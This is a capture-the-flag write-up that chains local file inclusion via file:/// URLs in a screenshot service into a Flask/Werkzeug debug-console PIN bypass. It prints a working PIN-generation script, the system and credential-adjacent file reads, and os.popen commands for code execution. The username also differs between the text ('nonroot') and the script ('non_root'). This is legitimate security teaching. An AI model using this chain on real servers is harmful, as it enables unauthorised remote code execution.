## About the Challenge

This is a **Flask Debug Mode** challenge. Opening the website, we are greeted with this page:

![screenshooter](/static/writeups/photos/screenshooter1.png)

Inputting a URL and clicking the "Screenshot" button will return a screenshot of the website. (Below is the screenshot of example.com):

![screenshooter](/static/writeups/photos/screenshooter2.png)

Inputting an invalid URL and clicking the "Screenshot" button will return an error message:

![screenshooter](/static/writeups/photos/screenshooter3.png)

This tells us that **Flask Debug Mode** is enabled. Flask Debug allows a user to execute arbitrary code on the server by visiting the **`/console`** route:

![screenshooter](/static/writeups/photos/screenshooter4.png)

Unfortunately, the **`/console`** route requires a PIN code to access it. The PIN code is determined by a few factors, which will be explored later. It is known that if these variables can be leaked in an application via **Local File Inclusion (LFI)**, then the PIN code can be determined, and the console can be accessed.

## Solve Process

The first step is to determine whether the application can read files on the server. From the source code:

```python_RETRACT
subprocess.run(f'timeout 5 firefox --window-size=1080,720 --screenshot {shlex.quote(filepath)} {shlex.quote(website)}', shell=True, check=True)
```

It seems the application is visiting and taking a screenshot of the website using Firefox. There seems to be no filtering done on the website link.

As such, we can use the **`file:///`** protocol to read any file on the server. Browsers use this protocol to read files on your device. For instance, opening a file on your own computer shows a link like **`file:///C:/Users/username/Desktop/file.txt`** in the address bar.

We can test this by inputting **`file:///etc/passwd`** into the input field. This should return the contents of the `/etc/passwd` file:

![screenshooter](/static/writeups/photos/screenshooter5.png)

This confirms that the application is vulnerable to **Local File Inclusion (LFI)**. From here on, when referring to "leaking" a file, it means appending **`file://`** to the file path.

### Determining the PIN Code

[Flask uses Werkzeug for its debugging console](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug). Werkzeug uses a PIN code which depends on the following factors:

1. The **username** who initiated the Flask session.
2. The **full path** of `app.py` within the Flask library directory.
3. The **MAC address** of the server.
4. The **Machine ID** of the server.

#### Step 1: Get the Username

The username can either be obtained from the Dockerfile of the application or by reading the `/etc/passwd` file. From the `/etc/passwd` file, we can see that the username (the last user on the list) is **`nonroot`**.

#### Step 2: Get the Path of `app.py`

From the error message induced earlier, we can see that the application's `app.py` directory is located at **`/usr/local/lib/python3.8/site-packages/flask/app.py`**.

#### Step 3: Get the MAC Address

The MAC address is obtained by first leaking the `/proc/net/arp` file to find the **device ID**:

![screenshooter](/static/writeups/photos/screenshooter6.png)

Thus, the device ID is `eth0`. Then, we can leak the `/sys/class/net/<deviceID>/address` (in our case, `/sys/class/net/eth0/address`) to find the MAC address of the server:

![screenshooter](/static/writeups/photos/screenshooter7.png)

Converting this to decimal gives our MAC address:

```text
2485378351106
```

#### Step 4: Get the Machine ID

Lastly, we can find the **Machine ID** by first leaking either `/etc/machine-id` (if it exists) or `/proc/sys/kernel/random/boot_id`. Then, concatenate the output of one of these files with the first line of `/proc/self/cgroup`, post the last slash.

In our case, the `/etc/machine-id` file does not exist, so we will use `/proc/sys/kernel/random/boot_id`:

![screenshooter](/static/writeups/photos/screenshooter8.png)

**`9bea372c-2ef2-40d2-b275-2412cedd21b8`**

Then, we leak `/proc/self/cgroup`:

![screenshooter](/static/writeups/photos/screenshooter9.png)

The first line is **`15:name=systemd:/docker/48f699be683d811fa0dba20f4a5e4c148baa1a30ac01aa35ddc16810fd31e438`**, post the last slash would be:

```text
48f699be683d811fa0dba20f4a5e4c148baa1a30ac01aa35ddc16810fd31e438
```

Appending this to `boot_id`, we get:

```text
9bea372c-2ef2-40d2-b275-2412cedd21b848f699be683d811fa0dba20f4a5e4c148baa1a30ac01aa35ddc16810fd31e438
```

### Generating the PIN Code

From the Dockerfile, the Flask version is **`flask~=1.1.4`**, meaning MD5 hashing was used to generate the PIN code. We use the following Python code (provided by [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)) to generate the PIN code:

```python_RETRACT
import hashlib
from itertools import chain
probably_public_bits = [
    'non_root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '2485378351106',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    '9bea372c-2ef2-40d2-b275-2412cedd21b848f699be683d811fa0dba20f4a5e4c148baa1a30ac01aa35ddc16810fd31e438'  # get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

The PIN code in this case is **`259-688-179`**, but it will vary depending on your instance.

### Accessing the Console

Visit the `/console` route and input the PIN code to access the console. Running the following code will return the flag:

```python
import os
os.popen("ls").read()
# Returns Dockerfile\napp.py\ndocker-compose.yml\nflags\nrequirements.txt\nscreenshots\ntemplates\n
# There's a flags directory, so we can run:
os.popen("ls flags").read()
# The flag is in theactuallyrealflag
os.popen("cat flags/theactuallyrealflag").read()
```

## Flag

```text
blahaj{fL45k_D3veL0p0r}
```

## Resources

- [Hacktricks on Werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)
